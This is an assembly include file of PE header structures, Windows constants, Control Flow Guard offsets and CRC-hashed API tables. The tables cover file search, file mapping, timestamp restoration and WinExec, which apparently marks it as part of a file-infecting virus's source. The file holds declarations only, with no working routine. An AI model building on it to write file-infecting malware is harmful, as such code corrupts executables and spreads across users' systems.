MAX_PATH                          equ     260

GMEM_ZEROINIT                     equ     40h

CREATE_ALWAYS                     equ     2
OPEN_EXISTING                     equ     3

FILE_READ_DATA                    equ     1
FILE_WRITE_DATA                   equ     2

FILE_ATTRIBUTE_DIRECTORY          equ     10h
FILE_ATTRIBUTE_ARCHIVE            equ     20h

FILE_MAP_WRITE                    equ     2

PAGE_READWRITE                    equ     4

IMAGE_FILE_MACHINE_I386           equ     14ch
IMAGE_FILE_MACHINE_AMD64          equ     8664h

IMAGE_FILE_EXECUTABLE_IMAGE       equ     2
IMAGE_FILE_SYSTEM                 equ     1000h
IMAGE_FILE_DLL                    equ     2000h

IMAGE_SUBSYSTEM_WINDOWS_GUI       equ     2

GuardCFCheckFunctionPointer       equ     48h
GuardFlags                        equ     58h
 
GuardCFCheckFunctionPointer64     equ     70h
GuardCFDispatchFunctionPointer64  equ     78h
GuardFlags64                      equ     90h

IMAGE_DLLCHARACTERISTICS_GUARD_CF equ     4000h

IMAGE_SCN_MEM_EXECUTE             equ     20000000h

mlDllBase                         equ     18h

struc   dllcrcstk
        .dWriteFile:    resd 1
        .dWinExec:      resd 1
        .dGlobalFree:   resd 1
        .dGlobalAlloc:  resd 1
        .dCreateFileA:  resd 1
        .dCloseHandle:  resd 1
endstruc

struc   krncrcstk
        .kUnmapViewOfFile:    resd 1
        .kSetFileTime:        resd 1
        .kSetFilePointer:     resd 1
        .kSetFileAttributesW: resd 1
        .kSetEndOfFile:       resd 1
        .kMapViewOfFile:      resd 1 
        .kFindNextFileW:      resd 1
        .kFindFirstFileW:     resd 1
        .kFindClose:          resd 1
        .kCreateFileW:        resd 1
        .kCreateFileMappingW: resd 1
        .kCloseHandle:        resd 1
endstruc

struc   FILETIME
        .dwLowDateTime :resd    1
        .dwHighDateTime:resd    1
endstruc

struc   WIN32_FIND_DATA
        .dwFileAttributes  :    resd    1
        .ftCreationTime    :    resb    FILETIME_size
        .ftLastAccessTime  :    resb    FILETIME_size
        .ftLastWriteTime   :    resb    FILETIME_size
        .dwFileSizeHigh    :    resd    1
        .dwFileSizeLow     :    resd    1
        .dwReserved0       :    resd    1
        .dwReserved1       :    resd    1
        .cFileName         :    resw    260
        .cAlternateFileName:    resw    14
endstruc

struc   mzhdr
        .mzsig     :    resw    1               ;00
        .mzpagemod :    resw    1               ;02
        .mzpagediv :    resw    1               ;04
        .mzrelocs  :    resw    1               ;06
        .mzhdrsize :    resw    1               ;08
        .mzminalloc:    resw    1               ;0A
        .mzmaxalloc:    resw    1               ;0C
        .mzss      :    resw    1               ;0E
        .mzsp      :    resw    1               ;10
        .mzchksum  :    resw    1               ;12
        .mzip      :    resw    1               ;14
        .mzcs      :    resw    1               ;16
        .mzreloff  :    resw    1               ;18
        .mzfiller  :    resb    22h             ;1A
        .mzlfanew  :    resd    1               ;3C
endstruc

struc   coffhdr
        .pemachine   :  resw    1               ;04
        .pesectcount :  resw    1               ;06
        .petimedate  :  resd    1               ;08
        .pesymbrva   :  resd    1               ;0C
        .pesymbcount :  resd    1               ;10
        .peopthdrsize:  resw    1               ;14
        .peflags     :  resw    1               ;16
endstruc

struc   pedir
        .dirrva :       resd    1
        .dirsize:       resd    1
endstruc

struc   pehdr
        .pesig        : resd    1               ;00
        .pecoff       : resb    coffhdr_size
        .pemagic      : resw    1               ;18
        .pemajorlink  : resb    1               ;1A
        .peminorlink  : resb    1               ;1B
        .pecodesize   : resd    1               ;1C
        .peidatasize  : resd    1               ;20
        .peudatasize  : resd    1               ;24
        .peentrypoint : resd    1               ;28
        .pecodebase   : resd    1               ;2c
        .pedatabase   : resd    1               ;30
        .peimagebase  : resd    1               ;34
        .pesectalign  : resd    1               ;38
        .pefilealign  : resd    1               ;3c
        .pemajoros    : resw    1               ;40
        .peminoros    : resw    1               ;42
        .pemajorimage : resw    1               ;44
        .peminorimage : resw    1               ;46
        .pemajorsubsys: resw    1               ;48
        .peminorsubsys: resw    1               ;4a
        .pereserved   : resd    1               ;4c
        .peimagesize  : resd    1               ;50
        .pehdrsize    : resd    1               ;54
        .pechksum     : resd    1               ;58
        .pesubsys     : resw    1               ;5C
        .pedllflags   : resw    1               ;5E
        .pestackmax   : resd    1               ;60
        .pestacksize  : resd    1               ;64
        .peheapmax    : resd    1               ;68
        .peheapsize   : resd    1               ;6C
        .peldrflags   : resd    1               ;70
        .pervacount   : resd    1               ;74
        .peexport     : resb    pedir_size      ;78
        .peimport     : resb    pedir_size      ;80
        .persrc       : resb    pedir_size      ;88
        .peexcpt      : resb    pedir_size      ;90
        .pesecurity   : resb    pedir_size      ;98
        .pereloc      : resb    pedir_size      ;A0
        .pedebug      : resb    pedir_size      ;A8
        .pearch       : resb    pedir_size      ;B0
        .peglobal     : resb    pedir_size      ;B8
        .petls        : resb    pedir_size      ;C0
        .peconfig     : resb    pedir_size      ;C8
        .pebound      : resb    pedir_size      ;D0
        .peiat        : resb    pedir_size      ;D8
        .pedelay      : resb    pedir_size      ;E0
        .pecom        : resb    pedir_size      ;E8
        .persrv       : resb    pedir_size      ;F0
endstruc

struc   pehdr64
        .pe64sig        :   resd    1               ;000
        .pe64coff       :   resb    coffhdr_size
        .pe64magic      :   resw    1               ;018
        .pe64majorlink  :   resb    1               ;01A
        .pe64minorlink  :   resb    1               ;01B
        .pe64codesize   :   resd    1               ;01C
        .pe64idatasize  :   resd    1               ;020
        .pe64udatasize  :   resd    1               ;024
        .pe64entrypoint :   resd    1               ;028
        .pe64codebase   :   resd    1               ;02C
        .pe64imagebase  :   resq    1               ;030
        .pe64sectalign  :   resd    1               ;038
        .pe64filealign  :   resd    1               ;03C
        .pe64majoros    :   resw    1               ;040
        .pe64minoros    :   resw    1               ;042
        .pe64majorimage :   resw    1               ;044
        .pe64minorimage :   resw    1               ;046
        .pe64majorsubsys:   resw    1               ;048
        .pe64minorsubsys:   resw    1               ;04A
        .pe64reserved   :   resd    1               ;04C
        .pe64imagesize  :   resd    1               ;050
        .pe64hdrsize    :   resd    1               ;054
        .pe64chksum     :   resd    1               ;058
        .pe64subsys     :   resw    1               ;05C
        .pe64dllflags   :   resw    1               ;05E
        .pe64stackmax   :   resq    1               ;060
        .pe64stacksize  :   resq    1               ;068
        .pe64heapmax    :   resq    1               ;070
        .pe64heapsize   :   resq    1               ;078
        .pe64ldrflags   :   resd    1               ;080
        .pe64rvacount   :   resd    1               ;084
        .pe64export     :   resb    pedir_size      ;088
        .pe64import     :   resb    pedir_size      ;090
        .pe64rsrc       :   resb    pedir_size      ;098
        .pe64excpt      :   resb    pedir_size      ;0A0
        .pe64security   :   resb    pedir_size      ;0A8
        .pe64reloc      :   resb    pedir_size      ;0B0
        .pe64debug      :   resb    pedir_size      ;0B8
        .pe64arch       :   resb    pedir_size      ;0C0
        .pe64global     :   resb    pedir_size      ;0C8
        .pe64tls        :   resb    pedir_size      ;0D0
        .pe64config     :   resb    pedir_size      ;0D8
        .pe64bound      :   resb    pedir_size      ;0E0
        .pe64iat        :   resb    pedir_size      ;0E8
        .pe64delay      :   resb    pedir_size      ;0F0
        .pe64com        :   resb    pedir_size      ;0F8
        .pe64rsrv       :   resb    pedir_size      ;100
endstruc

struc   peexp
        .expflags    :  resd    1
        .expdatetime :  resd    1
        .expmajorver :  resw    1
        .expminorver :  resw    1
        .expdllrva   :  resd    1
        .expordbase  :  resd    1
        .expadrcount :  resd    1
        .expnamecount:  resd    1
        .expadrrva   :  resd    1
        .expnamerva  :  resd    1
        .expordrva   :  resd    1
endstruc

struc   pesect
        .sectname     : resb    8
        .sectvirtsize : resd    1
        .sectvirtaddr : resd    1
        .sectrawsize  : resd    1
        .sectrawaddr  : resd    1
        .sectreladdr  : resd    1
        .sectlineaddr : resd    1
        .sectrelcount : resw    1
        .sectlinecount: resw    1
        .sectflags    : resd    1
endstruc